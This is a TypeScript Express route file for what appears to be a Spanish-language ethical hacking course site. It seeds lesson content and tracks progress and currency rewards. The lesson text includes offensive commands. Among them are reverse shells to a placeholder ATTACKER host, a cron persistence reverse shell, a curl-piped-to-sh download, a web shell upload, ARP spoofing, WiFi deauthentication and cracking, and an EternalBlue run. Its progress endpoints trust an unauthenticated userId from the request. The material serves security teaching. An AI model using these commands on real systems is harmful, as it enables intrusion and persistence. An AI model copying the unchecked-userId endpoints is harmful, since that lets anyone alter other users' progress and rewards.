import { Router } from "express";
import { db } from "@workspace/db";
import {
  courseLessonsTable, lessonProgressTable, courseEnrollmentsTable,
  coursesTable, spettroWalletsTable, spettroTransactionsTable,
} from "@workspace/db/schema";
import { eq, and } from "drizzle-orm";

const router = Router();

// ─── Video URLs per language ──────────────────────────────────────────────────
// Structure: { es, en, it, fr, pl, ro, sq }
// Use YouTube embed URLs. Each instructor uploads their own language version.
// Fallback chain: requested lang → es → en → first available

function v(es?: string, en?: string, it?: string, fr?: string, pl?: string, ro?: string, sq?: string) {
  const obj: Record<string, string> = {};
  if (es) obj.es = es;
  if (en) obj.en = en;
  if (it) obj.it = it;
  if (fr) obj.fr = fr;
  if (pl) obj.pl = pl;
  if (ro) obj.ro = ro;
  if (sq) obj.sq = sq;
  return Object.keys(obj).length > 0 ? JSON.stringify(obj) : null;
}

// ─── Lesson seed data per course ─────────────────────────────────────────────
type LessonSeed = {
  order: number; title: string; description: string;
  videoUrl: string | null; videoUrls: string | null;
  duration: number; isFree: boolean; content: string;
};

function buildLinuxLessons(): LessonSeed[] {
  return [
    {
      order: 1, isFree: true, duration: 820,
      title: "Introducción: ¿Por qué Linux para hacking?",
      description: "Historia, filosofía open-source y por qué los hackers prefieren Linux sobre Windows.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/47NhEBmUlGA",  // ES
        "https://www.youtube.com/embed/VbEx7B_PTOE",  // EN
        "https://www.youtube.com/embed/Wgi-OfbP9Gk",  // IT
        "https://www.youtube.com/embed/Wgi-OfbP9Gk",  // FR
      ),
      content: "# ¿Por qué Linux?\n\nLinux es el sistema operativo preferido por pentesters y hackers por sus herramientas nativas, control total y comunidad activa.\n\n## Distribuciones populares\n- **Kali Linux** — la estándar del sector\n- **Parrot OS** — más ligera, buena para portátiles\n- **BlackArch** — repositorio enorme de herramientas\n\n## Comandos esenciales\n```bash\nwhoami        # Usuario actual\nid            # UID, GID y grupos\nuname -a      # Información del sistema\n```",
    },
    {
      order: 2, isFree: true, duration: 740,
      title: "Navegación por el sistema de archivos",
      description: "cd, ls, pwd, find, locate. Entiende la jerarquía FHS de Linux.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/Dms5oHSLx9Q",  // ES
        "https://www.youtube.com/embed/IVquJh3DXUA",  // EN
        "https://www.youtube.com/embed/IVquJh3DXUA",  // IT
      ),
      content: "# Sistema de archivos Linux\n\n```\n/\n├── etc/      # Configuraciones\n├── home/     # Usuarios\n├── var/      # Logs, datos variables\n├── tmp/      # Temporal (escritura libre)\n└── proc/     # Procesos en tiempo real\n```\n\n## Comandos\n```bash\nls -la /etc        # Lista con permisos\nfind / -name '*.conf' 2>/dev/null\nlocate passwd\n```",
    },
    {
      order: 3, isFree: true, duration: 960,
      title: "Permisos y propietarios (chmod, chown)",
      description: "Lee e interpreta los permisos rwx, SUID/SGID y sticky bit.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/D-VqgvBiiso",  // ES
        "https://www.youtube.com/embed/4e669hSjaX8",  // EN
      ),
      content: "# Permisos en Linux\n\n```\n-rwxr-xr-x  root root  /bin/bash\n │└┬┘└┬┘└┬┘\n │ │  │  └─ Otros\n │ │  └──── Grupo\n │ └─────── Propietario\n └───────── Tipo (- archivo, d directorio)\n```\n\n## SUID — Escalada de privilegios\n```bash\nfind / -perm -4000 -type f 2>/dev/null\n```\nUn binario SUID se ejecuta como su propietario (root).",
    },
    {
      order: 4, isFree: false, duration: 1380,
      title: "Bash scripting para automatización",
      description: "Variables, condicionales, bucles y funciones. Escribe tus primeros scripts de hacking.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/4ygaA_y1wvQ",  // ES
        "https://www.youtube.com/embed/I4EWvMFj37g",  // EN
      ),
      content: "# Bash Scripting\n\n```bash\n#!/bin/bash\nTARGET=$1\nfor PORT in {1..1024}; do\n  (echo > /dev/tcp/$TARGET/$PORT) 2>/dev/null && echo \"OPEN: $PORT\"\ndone\n```\n\nEste script escanea los primeros 1024 puertos de un objetivo usando sólo bash.",
    },
    {
      order: 5, isFree: false, duration: 870,
      title: "Redes desde la terminal: netstat, ss, ip",
      description: "Inspecciona conexiones activas, interfaces y rutas. Herramienta clave en post-explotación.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/7iqCZHPwBf0",  // ES
        "https://www.youtube.com/embed/7iqCZHPwBf0",  // EN
      ),
      content: "# Análisis de red en Linux\n\n```bash\nss -tulnp          # Puertos en escucha\nnetstat -antp      # Conexiones activas\nip route show      # Tabla de rutas\narp -a             # Cache ARP (hosts en la red)\n```",
    },
    {
      order: 6, isFree: false, duration: 1020,
      title: "SSH: Conexión, tunneling y claves",
      description: "Gestiona claves SSH, crea túneles y pivota a través de hosts internos.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/v45p_kJV98k",  // ES
        "https://www.youtube.com/embed/v45p_kJV98k",  // EN
      ),
      content: "# SSH Tunneling\n\n## Port forwarding local\n```bash\nssh -L 8080:192.168.1.10:80 user@pivot\n```\n## Port forwarding remoto\n```bash\nssh -R 4444:localhost:4444 user@pivot\n```\n## SOCKS proxy (pivoting)\n```bash\nssh -D 1080 user@pivot\nproxychains nmap ...\n```",
    },
    {
      order: 7, isFree: false, duration: 750,
      title: "Procesos, cron y persistencia",
      description: "Gestiona procesos, analiza cron jobs y detecta mecanismos de persistencia.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/TP8CH2Z-7WY",  // ES
        "https://www.youtube.com/embed/TP8CH2Z-7WY",  // EN
      ),
      content: "# Procesos y persistencia\n\n```bash\nps aux | grep root\ncrontab -l\nls /etc/cron*\ncat /var/spool/cron/crontabs/root\n```\n\n## Persistencia con cron\n```bash\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.1/4444 0>&1'\n```",
    },
    {
      order: 8, isFree: false, duration: 930,
      title: "Herramientas esenciales: wget, curl, nc, socat",
      description: "Descarga archivos, enumera servicios web y establece shells inversas con estas utilidades.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/3Kq1MIfTWCE",  // ES
        "https://www.youtube.com/embed/3Kq1MIfTWCE",  // EN
      ),
      content: "# Utilidades esenciales\n\n```bash\n# Reverse shell con nc\nnc -lvnp 4444\nbash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\n# Subir archivos con curl\ncurl -F 'file=@shell.php' http://target/upload\n\n# Servidor HTTP rápido\npython3 -m http.server 8000\nwget http://ATTACKER:8000/linpeas.sh\n```",
    },
  ];
}

function buildIntroLessons(): LessonSeed[] {
  return [
    {
      order: 1, isFree: true, duration: 680,
      title: "¿Qué es el hacking ético?",
      description: "Diferencia entre hacking ético, penetration testing y bug bounty. Marco legal.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/E_-4FlBeGgc",  // ES
        "https://www.youtube.com/embed/U4oB28ksiIo",  // EN
        "https://www.youtube.com/embed/U4oB28ksiIo",  // IT
        "https://www.youtube.com/embed/U4oB28ksiIo",  // FR
      ),
      content: "# Hacking Ético\n\n## Definición\nEl hacking ético consiste en atacar sistemas **con autorización** para encontrar vulnerabilidades antes que actores maliciosos.\n\n## Tipos\n- **Pentest** — evaluación contratada con alcance definido\n- **Bug Bounty** — programas públicos donde reportas y cobras\n- **Red Team** — simulación de adversario avanzado (APT)\n\n## Marco legal (España/LATAM)\n- Ley Orgánica 10/1995 art. 197 bis — acceso sin autorización\n- Siempre obtén **autorización escrita** antes de empezar",
    },
    {
      order: 2, isFree: true, duration: 910,
      title: "Metodología: fases de un pentest",
      description: "Reconocimiento, escaneo, explotación, post-explotación e informe. La metodología completa.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/3Kq1MIfTWCE",  // ES
        "https://www.youtube.com/embed/3Kq1MIfTWCE",  // EN
      ),
      content: "# Fases del Pentesting\n\n1. **Reconocimiento** — OSINT, DNS, subdominios\n2. **Escaneo** — nmap, servicios, versiones\n3. **Enumeración** — usuarios, shares, rutas\n4. **Explotación** — CVEs, misconfiguraciones\n5. **Post-explotación** — pivot, persistencia, data\n6. **Informe** — hallazgos, CVSS, remediación",
    },
    {
      order: 3, isFree: true, duration: 1240,
      title: "Tu primer laboratorio: Kali Linux",
      description: "Instala Kali en VirtualBox/VMware, configura la red y conecta la VPN de SpettroWeb.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/lZAoFs75_cs",  // ES
        "https://www.youtube.com/embed/lZAoFs75_cs",  // EN
      ),
      content: "# Configura tu Kali\n\n```bash\n# Actualizar todo\nsudo apt update && sudo apt full-upgrade -y\n\n# Instalar herramientas extra\nsudo apt install -y seclists gobuster feroxbuster\n\n# Conectar VPN SpettroWeb\nsudo openvpn spettroweb.ovpn\n```",
    },
    {
      order: 4, isFree: true, duration: 1560,
      title: "Nmap: el arte del escaneo",
      description: "Detección de hosts, puertos, servicios y SO. Scripts NSE y escaneos sigilosos.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/4t4kBkMsDbQ",  // ES
        "https://www.youtube.com/embed/4t4kBkMsDbQ",  // EN
      ),
      content: "# Nmap Esencial\n\n```bash\n# Escaneo básico\nnmap -sV -sC -oN scan.txt 10.10.10.1\n\n# Todos los puertos\nnmap -p- --min-rate 5000 10.10.10.1\n\n# Scripts de vuln\nnmap --script vuln 10.10.10.1\n\n# Sigiloso (SYN)\nnmap -sS 10.10.10.1\n```",
    },
    {
      order: 5, isFree: false, duration: 1840,
      title: "Metasploit: tu primera explotación",
      description: "Framework de explotación. Busca módulos, configura exploits y obtén tu primera reverse shell.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/8lR27r8Y_ik",  // ES
        "https://www.youtube.com/embed/8lR27r8Y_ik",  // EN
      ),
      content: "# Metasploit Framework\n\n```bash\nmsfconsole\nsearch eternalblue\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.10.10.1\nset LHOST 10.10.10.100\nrun\n```",
    },
    {
      order: 6, isFree: false, duration: 1400,
      title: "Escalada de privilegios Linux básica",
      description: "SUID, sudo -l, cron jobs y contraseñas en texto plano. Tus primeras técnicas de privesc.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/dk2wsyFiosg",  // ES
        "https://www.youtube.com/embed/dk2wsyFiosg",  // EN
      ),
      content: "# PrivEsc Linux\n\n```bash\n# Qué puedo ejecutar como root\nsudo -l\n\n# Binarios SUID\nfind / -perm -4000 2>/dev/null\n\n# LinPEAS\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n```",
    },
    {
      order: 7, isFree: false, duration: 720,
      title: "Tu primer write-up: documenta el proceso",
      description: "Cómo escribir un buen write-up técnico, capturas de pantalla y reporte de vulnerabilidades.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/kn-568RdBSE",  // ES
        "https://www.youtube.com/embed/kn-568RdBSE",  // EN
      ),
      content: "# Write-up perfecto\n\n## Estructura\n1. Resumen ejecutivo\n2. Reconocimiento (nmap, headers)\n3. Explotación (paso a paso, screenshots)\n4. Post-explotación\n5. Remediación recomendada\n\nUsa **Markdown** para formatear y sube a tu blog o GitHub.",
    },
    {
      order: 8, isFree: false, duration: 580,
      title: "Recursos, comunidades y próximos pasos",
      description: "HTB, TryHackMe, CTFs y cómo seguir progresando en ciberseguridad.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/E_-4FlBeGgc",  // ES
        "https://www.youtube.com/embed/E_-4FlBeGgc",  // EN
      ),
      content: "# Continúa aprendiendo\n\n## Plataformas\n- **HackTheBox** — CTF-style, muy técnico\n- **TryHackMe** — guiado, ideal para principiantes\n- **VulnYX** — español, integrado en SpettroWeb\n\n## Certificaciones\n- eJPTv2 — primera cert práctica\n- OSCP — el estándar del sector\n- BSCP — web hacking avanzado",
    },
  ];
}

function buildRedesLessons(): LessonSeed[] {
  return [
    {
      order: 1, isFree: true, duration: 1020,
      title: "Fundamentos TCP/IP",
      description: "Modelo OSI, capas, encapsulación de paquetes y el handshake TCP.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/5D1ODmDnfkI",  // ES
        "https://www.youtube.com/embed/5D1ODmDnfkI",  // EN
        "https://www.youtube.com/embed/5D1ODmDnfkI",  // IT
        "https://www.youtube.com/embed/5D1ODmDnfkI",  // FR
      ),
      content: "# TCP/IP desde cero\n\n## Modelo OSI\n| Capa | Nombre | Protocolo |\n|------|--------|----------|\n| 7 | Aplicación | HTTP, DNS, FTP |\n| 4 | Transporte | TCP, UDP |\n| 3 | Red | IP, ICMP |\n| 2 | Enlace | Ethernet, ARP |\n\n## Three-way handshake\n```\nCliente → SYN     → Servidor\nCliente ← SYN-ACK ← Servidor\nCliente → ACK     → Servidor\n```",
    },
    {
      order: 2, isFree: true, duration: 1380,
      title: "Wireshark: captura y análisis de tráfico",
      description: "Instala Wireshark, captura en interfaces y filtra paquetes relevantes para tu pentest.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/qTaOZrDnMzQ",  // ES
        "https://www.youtube.com/embed/qTaOZrDnMzQ",  // EN
      ),
      content: "# Wireshark filters\n\n```\nhttp.request.method == \"POST\"    # Formularios\ndns                               # Todo DNS\nip.addr == 10.10.10.1            # Host específico\ntcp.port == 445                  # SMB\ncredentials                      # ¡Contraseñas en claro!\n```",
    },
    {
      order: 3, isFree: true, duration: 1150,
      title: "ARP Spoofing y Man-in-the-Middle",
      description: "Envenena la caché ARP, intercepta tráfico y ejecuta tu primer MITM en red local.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/A7nih6SANYs",  // ES
        "https://www.youtube.com/embed/A7nih6SANYs",  // EN
      ),
      content: "# ARP Spoofing\n\n```bash\n# Con arpspoof\narpspoof -i eth0 -t VICTIM GATEWAY\narpspoof -i eth0 -t GATEWAY VICTIM\n\n# Con ettercap\nettercap -T -q -M arp:remote /VICTIM// /GATEWAY//\n```\n\nActiva IP forwarding para no romper la conexión:\n```bash\necho 1 > /proc/sys/net/ipv4/ip_forward\n```",
    },
    {
      order: 4, isFree: false, duration: 890,
      title: "DNS: enumeración y ataques",
      description: "Transferencia de zona, fuerza bruta de subdominios y DNS spoofing.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/mpY8HqGRv8E",  // ES
        "https://www.youtube.com/embed/mpY8HqGRv8E",  // EN
      ),
      content: "# DNS Hacking\n\n```bash\n# Transferencia de zona\ndig axfr target.com @ns1.target.com\n\n# Fuerza bruta subdominios\ngobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n\n# Resolución inversa\nnslookup 192.168.1.1\n```",
    },
    {
      order: 5, isFree: false, duration: 780,
      title: "Sniffing con tcpdump",
      description: "Captura sin interfaz gráfica, filtra por protocolo e intercepta credenciales.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/1lDfLcdMtrQ",  // ES
        "https://www.youtube.com/embed/1lDfLcdMtrQ",  // EN
      ),
      content: "# tcpdump esencial\n\n```bash\n# Captura en eth0\ntcpdump -i eth0 -w captura.pcap\n\n# Filtra HTTP POST\ntcpdump -i eth0 port 80 and 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354'\n\n# Lee el pcap\ntcpdump -r captura.pcap -A | grep -i 'password\\|pass\\|pwd'\n```",
    },
    {
      order: 6, isFree: false, duration: 960,
      title: "VLANs y segmentación de red",
      description: "Entiende VLANs, VLAN hopping y cómo pivotear entre segmentos en redes corporativas.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/hHGj0VLNCRY",  // ES
        "https://www.youtube.com/embed/hHGj0VLNCRY",  // EN
      ),
      content: "# VLAN Hopping\n\n## Switch Spoofing\n```bash\nyersinia -G   # Interfaz gráfica\nyersinia -I   # Interactivo\n```\n\n## Double Tagging\nRequiere estar en la VLAN nativa del trunk.",
    },
    {
      order: 7, isFree: false, duration: 1420,
      title: "Ataques a WiFi: WPA2 y handshakes",
      description: "Captura handshakes WPA2, crácalos con hashcat y entiende PMF (Protected Management Frames).",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/Hy0rRp3Rqk0",  // ES
        "https://www.youtube.com/embed/Hy0rRp3Rqk0",  // EN
      ),
      content: "# WiFi Hacking\n\n```bash\n# Monitor mode\nairmon-ng start wlan0\n\n# Captura handshake\nairodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon\n\n# Deautenticar cliente\naireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon\n\n# Crackear WPA2\nhashcat -m 22000 captura.hc22000 rockyou.txt\n```",
    },
    {
      order: 8, isFree: false, duration: 2100,
      title: "Proyecto final: Red corporativa simulada",
      description: "Escanea, enumera y compromete una red con múltiples segmentos usando todo lo aprendido.",
      videoUrl: null,
      videoUrls: v(
        "https://www.youtube.com/embed/FsN9Kxj1Hxs",  // ES
        "https://www.youtube.com/embed/FsN9Kxj1Hxs",  // EN
      ),
      content: "# Proyecto Final\n\n## Escenario\nRed corporativa con:\n- Servidor web (DMZ)\n- Base de datos interna\n- Controlador de dominio Windows\n- Estaciones de trabajo\n\n## Objetivo\nComprometer el DC y extraer hashes NTLM.",
    },
  ];
}

async function seedLessonsForCourse(courseId: number, lessons: LessonSeed[]) {
  const existing = await db.select().from(courseLessonsTable)
    .where(eq(courseLessonsTable.courseId, courseId));
  if (existing.length > 0) return existing;
  return db.insert(courseLessonsTable).values(
    lessons.map(l => ({ ...l, courseId }))
  ).returning();
}

// GET /api/public/courses/:id/lessons
router.get("/public/courses/:id/lessons", async (req, res) => {
  try {
    const courseId = parseInt(req.params.id);
    const [course] = await db.select().from(coursesTable).where(eq(coursesTable.id, courseId));
    if (!course) return res.status(404).json({ error: "Curso no encontrado" });

    let lessons = await db.select().from(courseLessonsTable)
      .where(eq(courseLessonsTable.courseId, courseId));

    if (lessons.length === 0) {
      let seedData: LessonSeed[];
      if (course.category === "fundamentos" && course.instructor === "Ph4ntom") {
        seedData = buildLinuxLessons();
      } else if (course.category === "fundamentos") {
        seedData = buildIntroLessons();
      } else if (course.category === "redes") {
        seedData = buildRedesLessons();
      } else {
        seedData = buildIntroLessons();
      }
      lessons = await seedLessonsForCourse(courseId, seedData);
    }

    // Parse videoUrls JSON string → object so frontend can use it directly
    const result = lessons.sort((a, b) => a.order - b.order).map(l => ({
      ...l,
      videoUrls: l.videoUrls ? (() => {
        try { return JSON.parse(l.videoUrls!); } catch { return {}; }
      })() : {},
    }));

    res.json(result);
  } catch (err) {
    req.log.error(err);
    res.status(500).json({ error: "Error" });
  }
});

// GET /api/public/courses/:id/progress/:userId
router.get("/public/courses/:id/progress/:userId", async (req, res) => {
  try {
    const courseId = parseInt(req.params.id);
    const userId = parseInt(req.params.userId);
    const progress = await db.select().from(lessonProgressTable)
      .where(and(eq(lessonProgressTable.courseId, courseId), eq(lessonProgressTable.userId, userId)));
    res.json(progress);
  } catch (err) {
    req.log.error(err);
    res.status(500).json({ error: "Error" });
  }
});

// POST /api/public/lessons/:lessonId/complete
router.post("/public/lessons/:lessonId/complete", async (req, res) => {
  try {
    const lessonId = parseInt(req.params.lessonId);
    const { userId, courseId } = req.body as { userId: number; courseId: number };
    if (!userId || !courseId) return res.status(400).json({ error: "userId y courseId requeridos" });

    const [lesson] = await db.select().from(courseLessonsTable).where(eq(courseLessonsTable.id, lessonId));
    if (!lesson) return res.status(404).json({ error: "Lección no encontrada" });

    // Upsert progress
    const [existing] = await db.select().from(lessonProgressTable)
      .where(and(eq(lessonProgressTable.userId, userId), eq(lessonProgressTable.lessonId, lessonId)));

    if (existing) {
      await db.update(lessonProgressTable).set({
        completed: true, completedAt: new Date(), updatedAt: new Date(),
      }).where(eq(lessonProgressTable.id, existing.id));
    } else {
      await db.insert(lessonProgressTable).values({
        userId, lessonId, courseId, completed: true,
        watchedSeconds: lesson.duration, completedAt: new Date(),
      });
    }

    // Check if all lessons completed → give SPC reward
    const allLessons = await db.select().from(courseLessonsTable).where(eq(courseLessonsTable.courseId, courseId));
    const completedProgress = await db.select().from(lessonProgressTable)
      .where(and(eq(lessonProgressTable.userId, userId), eq(lessonProgressTable.courseId, courseId), eq(lessonProgressTable.completed, true)));

    if (completedProgress.length >= allLessons.length) {
      const [enrollment] = await db.select().from(courseEnrollmentsTable)
        .where(and(eq(courseEnrollmentsTable.userId, userId), eq(courseEnrollmentsTable.courseId, courseId)));

      if (enrollment && !enrollment.spcRewarded) {
        const [crs] = await db.select().from(coursesTable).where(eq(coursesTable.id, courseId));
        const reward = crs?.spcReward ?? 100;

        await db.update(courseEnrollmentsTable).set({
          completed: true, completedAt: new Date(), spcRewarded: true, progress: 100,
        }).where(eq(courseEnrollmentsTable.id, enrollment.id));

        const [wallet] = await db.select().from(spettroWalletsTable).where(eq(spettroWalletsTable.userId, userId));
        if (wallet) {
          await db.update(spettroWalletsTable).set({
            balance: wallet.balance + reward, totalEarned: wallet.totalEarned + reward, updatedAt: new Date(),
          }).where(eq(spettroWalletsTable.userId, userId));
        } else {
          await db.insert(spettroWalletsTable).values({ userId, balance: reward, totalEarned: reward });
        }
        await db.insert(spettroTransactionsTable).values({
          userId, amount: reward, type: "earned",
          description: `Curso completado: ${crs?.title ?? "Curso"}`, referenceId: `course_done_${courseId}`,
        });

        return res.json({ ok: true, courseCompleted: true, spcEarned: reward });
      }
    }

    // Update enrollment progress %
    const [enrollment] = await db.select().from(courseEnrollmentsTable)
      .where(and(eq(courseEnrollmentsTable.userId, userId), eq(courseEnrollmentsTable.courseId, courseId)));

    if (enrollment) {
      const allLessonsCount = allLessons.length || 1;
      const pct = Math.round((completedProgress.length / allLessonsCount) * 100);
      await db.update(courseEnrollmentsTable).set({ progress: pct }).where(eq(courseEnrollmentsTable.id, enrollment.id));
    }

    res.json({ ok: true, courseCompleted: false });
  } catch (err) {
    req.log.error(err);
    res.status(500).json({ error: "Error" });
  }
});

export default router;
